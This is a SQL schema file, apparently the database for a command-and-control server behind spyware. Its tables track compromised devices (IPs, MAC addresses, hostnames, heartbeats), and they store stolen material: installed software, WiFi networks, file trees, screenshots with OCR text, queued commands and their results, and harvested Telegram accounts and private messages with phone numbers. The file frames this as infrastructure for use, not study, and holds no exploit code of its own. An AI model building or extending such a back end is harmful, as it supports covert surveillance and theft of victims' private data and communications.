
-- C2 Device (Standardize to snake_case)
create table if not exists c2_device
(
    id           bigint auto_increment primary key,
    uuid         varchar(64)                        null comment 'Unique Device ID',
    internal_ip  varchar(64)                        null comment 'Internal IP',
    external_ip  varchar(64)                        null comment 'External IP',
    mac_address  varchar(64)                        null comment 'MAC Address',
    host_name    varchar(128)                       null comment 'Hostname',
    os           varchar(128)                       null comment 'OS Info',
    last_seen    datetime                           null comment 'Last Seen',
    heartbeat_interval int default 60000            comment 'Heartbeat Interval',
    is_monitor_on tinyint      default 0            comment 'Is Monitor On',
    current_tg_id varchar(64)                       null comment 'Current Telegram ID',
    data_status  varchar(32)                        null comment 'Data Status',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    update_time  datetime     default CURRENT_TIMESTAMP not null comment 'Update Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_uuid (uuid)
);

-- C2 Software List (Standardize to snake_case)
create table if not exists c2_software
(
    id           bigint auto_increment primary key,
    device_id    bigint                             not null comment 'Device ID',
    name         varchar(256)                       not null comment 'Software Name',
    version      varchar(64)                        null comment 'Version',
    install_date varchar(64)                        null comment 'Install Date',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_id (device_id)
);

-- C2 WiFi Data (Standardize to snake_case)
create table if not exists c2_wifi
(
    id           bigint auto_increment primary key,
    device_id    bigint                             not null comment 'Device ID',
    ssid         varchar(128)                       not null comment 'SSID',
    bssid        varchar(64)                        null comment 'BSSID (MAC)',
    signal_strength varchar(32)                      null comment 'Signal Strength',
    authentication varchar(64)                      null comment 'Authentication',
    create_time   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete     tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_id (device_id)
);

-- C2 File Scan Results (Standardize to snake_case) - MERGED INTO c2_file_system_node
-- create table if not exists c2_file_scan
-- (
--    id           bigint auto_increment primary key,
--    device_id    bigint                             not null comment 'Device ID',
--    file_path    text                               not null comment 'File Path',
--    file_name    varchar(256)                       not null comment 'File Name',
--    file_size    bigint                             not null comment 'File Size',
--    md5          varchar(32)                        null comment 'MD5 Hash',
--    is_recent    tinyint      default 0             not null comment 'Is Recently Modified',
--    last_modified datetime                           null comment 'Last Modified',
--    create_time   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
--    is_delete     tinyint      default 0             not null comment 'Is Deleted',
--    index idx_device_id (device_id)
-- );

-- C2 Tasks Table (Keep camelCase where it matches existing code heavily, or update?)
-- C2Task.java usually uses camelCase fields. Let's check C2Task.java later.
-- For now assuming C2Task uses camelCase columns in DB.
create table if not exists c2_task
(
    id           bigint auto_increment comment 'id' primary key,
    taskId       varchar(64)                        not null comment 'Task ID',
    deviceId     bigint                             null comment 'Target Device ID (null for broadcast)',
    deviceUuid   varchar(64)                        null comment 'Target Device UUID',
    command      varchar(256)                       not null comment 'Command',
    params       text                               null comment 'Parameters',
    status       varchar(32) default 'pending'      not null comment 'Status',
    result       longtext                           null comment 'Result',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
    isDelete     tinyint      default 0                 not null comment 'Is Deleted',
    index idx_taskId (taskId),
    index idx_deviceId (deviceId)
) comment 'C2 Tasks' collate = utf8mb4_unicode_ci;

-- Collected Data Table
create table if not exists collected_data
(
    id           bigint auto_increment comment 'id' primary key,
    dataId       varchar(64)                        not null comment 'Data ID',
    dataType     varchar(32)                        not null comment 'Data Type',
    content      longtext                           null comment 'Content (Base64 or Text)',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    isDelete     tinyint      default 0                 not null comment 'Is Deleted'
) comment 'Collected Data' collate = utf8mb4_unicode_ci;

-- TG Account Table
create table if not exists tg_account
(
    id           bigint auto_increment comment 'id' primary key,
    tgId         varchar(64)                        null comment 'Telegram ID',
    username     varchar(128)                       null comment 'Username',
    phone        varchar(32)                        null comment 'Phone',
    firstName    varchar(128)                       null comment 'First Name',
    lastName     varchar(128)                       null comment 'Last Name',
    isBot        tinyint      default 0             comment 'Is Bot',
    isPremium    tinyint      default 0             comment 'Is Premium',
    systemInfo   text                               null comment 'System Info',
    device_uuid  varchar(64)                        null comment 'Device UUID',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted'
) comment 'TG Accounts' collate = utf8mb4_unicode_ci;

-- TG Message Table
create table if not exists tg_message
(
    id           bigint auto_increment comment 'id' primary key,
    account_id   bigint                             not null comment 'Account ID',
    msg_id       bigint                             null comment 'Message ID',
    chat_id      varchar(64)                        null comment 'Chat ID',
    sender_id    varchar(64)                        null comment 'Sender ID',
    sender_username varchar(128)                    null comment 'Sender Username',
    sender_phone varchar(32)                        null comment 'Sender Phone',
    receiver_id  varchar(64)                        null comment 'Receiver ID',
    receiver_username varchar(128)                  null comment 'Receiver Username',
    receiver_phone varchar(32)                      null comment 'Receiver Phone',
    content      text                               null comment 'Content',
    msg_type     varchar(32)                        null comment 'Message Type',
    media_path   varchar(256)                       null comment 'Media Path',
    msg_date     datetime                           null comment 'Message Date',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted'
) comment 'TG Messages' collate = utf8mb4_unicode_ci;

-- C2 Screenshot Table (Standardize to snake_case)
create table if not exists c2_screenshot
(
    id           bigint auto_increment primary key,
    device_id    bigint                             not null comment 'Device ID',
    task_id      varchar(64)                        null comment 'Task ID',
    url          varchar(512)                       null comment 'URL',
    ocr_result   text                               null comment 'OCR Result',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_id (device_id)
) comment 'C2 Screenshots' collate = utf8mb4_unicode_ci;

-- C2 File System Node (Tree View)
create table if not exists c2_file_system_node
(
    id           bigint auto_increment primary key,
    device_id    bigint                             not null comment 'Device ID',
    parent_path  text                               null comment 'Parent Path',
    name         varchar(256)                       not null comment 'Name',
    path         text                               not null comment 'Full Path',
    is_directory tinyint      default 0             not null comment 'Is Directory',
    size         bigint       default 0             not null comment 'Size',
    md5          varchar(32)                        null comment 'MD5 Hash',
    is_recent    tinyint      default 0             not null comment 'Is Recently Modified',
    last_modified datetime                          null comment 'Last Modified',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_id (device_id)
) comment 'File System Tree' collate = utf8mb4_unicode_ci;

-- User Table (t_user)
create table if not exists t_user
(
    id           bigint auto_increment comment 'id' primary key,
    userAccount  varchar(256)                           not null comment '账号',
    userPassword varchar(512)                           not null comment '密码',
    userName     varchar(256)                           null comment '用户昵称',
    userAvatar   varchar(1024)                          null comment '用户头像',
    userProfile  varchar(512)                           null comment '用户简介',
    userRole     varchar(256) default 'user'            not null comment '用户角色：user/admin',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment '创建时间',
    updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment '更新时间',
    isDelete     tinyint      default 0                 not null comment '是否删除'
) comment '用户' collate = utf8mb4_unicode_ci;
